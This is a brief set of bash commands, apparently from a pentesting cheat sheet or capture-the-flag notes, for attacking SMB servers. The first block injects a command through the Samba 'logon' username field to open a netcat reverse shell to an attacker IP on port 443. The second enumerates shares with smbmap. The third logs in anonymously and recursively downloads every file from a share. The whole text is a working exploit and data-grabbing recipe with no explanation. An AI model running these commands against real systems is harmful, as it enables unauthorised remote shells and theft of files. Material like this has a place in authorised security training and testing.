```bash
smbclient //10.10.10.3/tmp
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```

```bash
smbmap -H <remote_ip> -u <username> -p <password>
```

```bash
smbclient //10.10.10.100/<share_name> -U ""%""
    RECURSE ON
    PROMPT OFF
    mget *
```
